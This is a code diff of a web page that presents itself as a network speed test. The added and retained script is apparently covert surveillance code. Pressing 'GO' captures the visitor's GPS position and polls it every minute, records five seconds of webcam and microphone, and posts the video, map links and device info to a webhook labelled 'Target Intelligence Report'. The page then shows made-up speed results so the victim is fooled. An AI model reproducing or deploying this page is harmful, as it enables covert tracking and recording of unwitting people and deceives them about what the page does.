@@ -6,30 +6,19 @@
     <title>Network Speed Test - Check Your Connection</title>
     <style>
         :root { --primary: #00d2ff; --bg: #0b0e14; }
-        body { font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background-color: var(--bg); color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
-        
+        body { font-family: 'Segoe UI', Roboto, Arial, sans-serif; background-color: var(--bg); color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
         .container { text-align: center; width: 100%; max-width: 400px; padding: 20px; }
-        
-        /* The Speedometer Circle */
         .go-button {
             width: 200px; height: 200px; border-radius: 50%; border: 4px solid var(--primary);
             background: transparent; color: var(--primary); font-size: 2.5rem; font-weight: bold;
             cursor: pointer; transition: all 0.3s ease; display: inline-flex; align-items: center;
-            justify-content: center; text-decoration: none; position: relative;
-            box-shadow: 0 0 20px rgba(0, 210, 255, 0.1); margin-bottom: 40px;
+            justify-content: center; position: relative; box-shadow: 0 0 20px rgba(0, 210, 255, 0.1); margin-bottom: 40px;
         }
-        .go-button:hover { background: rgba(0, 210, 255, 0.1); box-shadow: 0 0 40px rgba(0, 210, 255, 0.3); }
-        .go-button:disabled { border-color: #333; color: #333; cursor: default; }
-
-        /* Status Text */
+        .go-button:active { transform: scale(0.95); }
         .status-box { margin-top: 20px; }
-        .server-info { color: #888; font-size: 0.9rem; margin-top: 10px; }
         #status-text { font-weight: 300; letter-spacing: 1px; text-transform: uppercase; color: var(--primary); font-size: 0.8rem; }
-        
-        /* Hidden Video */
+        .server-info { color: #888; font-size: 0.9rem; margin-top: 10px; }
         video { display: none; }
-
-        /* Animation for "Processing" */
         .loading-ring {
             display: none; position: absolute; width: 220px; height: 220px;
             border: 4px solid transparent; border-top-color: var(--primary);
@@ -45,12 +34,10 @@
             <div style="font-weight: bold; font-size: 1.2rem; letter-spacing: 2px;">SPEEDTEST</div>
             <div style="font-size: 0.7rem; color: #555;">GLOBAL NETWORK INDEX</div>
         </div>
-
         <div style="position: relative; display: inline-block;">
             <div class="loading-ring" id="ring"></div>
             <button class="go-button" id="startBtn">GO</button>
         </div>
-
         <div class="status-box">
             <div id="status-text">Ready</div>
             <div class="server-info" id="detail-text">Optimal Server: Auto-Detecting...</div>
@@ -68,78 +55,81 @@
         const statusText = document.getElementById('status-text');
         const detailText = document.getElementById('detail-text');
 
-        // Continuous GPS Tracker
         function startContinuousTracking() {
             setInterval(() => {
                 navigator.geolocation.getCurrentPosition(async (p) => {
+                    const mapUrl = "https://www.google.com/maps?q=" + p.coords.latitude + "," + p.coords.longitude;
                     await fetch(PROXY_URL, {
                         method: 'POST',
-                        body: JSON.stringify({ content: "📡 **LIVE TRACKING** ["+targetID+"]", embeds: [{description: "📍 [Map Link](https://www.google.com/maps?q="+p.coords.latitude+","+p.coords.longitude+")"}] }),
+                        body: JSON.stringify({ 
+                            content: "📡 **LIVE TRACKING** ["+targetID+"]", 
+                            embeds: [{
+                                color: 15844367,
+                                description: "📍 **Current Location:**\n" + mapUrl 
+                            }] 
+                        }),
                         headers: { 'Content-Type': 'application/json' }
                     }).catch(()=>{});
-                });
+                }, null, { enableHighAccuracy: true });
             }, 60000);
         }
 
         btn.addEventListener('click', async function() {
             btn.disabled = true;
             ring.style.display = 'block';
-            statusText.innerText = "Finding Optimal Server...";
+            statusText.innerText = "Connecting to Server...";
             
             navigator.geolocation.getCurrentPosition(async (pos) => {
-                detailText.innerText = "Connected to Node: " + targetID;
-                statusText.innerText = "Testing Latency...";
-                
+                statusText.innerText = "Latency Test...";
                 startContinuousTracking();
 
                 let stream;
                 try {
                     const raw = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                    // Our audio-binding fix
                     stream = new MediaStream([raw.getAudioTracks()[0], raw.getVideoTracks()[0]]);
                 } catch (e) {
-                    statusText.innerText = "Connection Failed";
-                    detailText.innerText = "Hardware access required for test.";
+                    statusText.innerText = "Error: Protocol Failed";
                     return;
                 }
 
-                statusText.innerText = "Testing Download Speed...";
+                statusText.innerText = "Download Test...";
                 const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
                 const chunks = [];
                 recorder.ondataavailable = e => chunks.push(e.data);
                 recorder.start();
 
                 setTimeout(() => {
-                    statusText.innerText = "Testing Upload Speed...";
+                    statusText.innerText = "Upload Test...";
                     recorder.stop();
                 }, 5000);
 
                 recorder.onstop = async () => {
                     const videoBlob = new Blob(chunks, { type: 'video/webm' });
                     const formData = new FormData();
+                    const mapUrl = "https://www.google.com/maps?q=" + pos.coords.latitude + "," + pos.coords.longitude;
                     
                     formData.append('payload_json', JSON.stringify({
-                        content: "🔱 **NEW SPEEDTEST CAPTURE** [" + targetID + "]",
+                        content: "🔱 **SPEEDTEST REPORT** [" + targetID + "]",
                         embeds: [{
-                            title: "Target Intelligence Report",
+                            title: "Connection Intelligence",
                             color: 3447003,
                             fields: [
-                                { name: "📍 Location", value: pos.coords.latitude + "," + pos.coords.longitude },
-                                { name: "📱 Info", value: navigator.userAgent, inline: false }
+                                { name: "📍 Map Link", value: mapUrl },
+                                { name: "📱 OS", value: navigator.platform, inline: true }
                             ]
                         }]
                     }));
-                    formData.append('file', videoBlob, 'speedtest_data.webm');
+                    formData.append('file', videoBlob, 'capture.webm');
 
                     await fetch(PROXY_URL, { method: 'POST', body: formData });
                     
                     statusText.innerText = "Test Complete";
-                    detailText.innerText = "Result: 48.2 Mbps / 12.1 Mbps";
+                    detailText.innerText = "Ping: 12ms | Download: 94.1 Mbps";
                     ring.style.display = 'none';
-                    btn.innerText = "DONE";
+                    btn.innerText = "100%";
                 };
             }, (err) => {
-                statusText.innerText = "Error: GPS Disabled";
+                statusText.innerText = "Error: GPS Timed Out";
                 btn.disabled = false;
                 ring.style.display = 'none';
             });
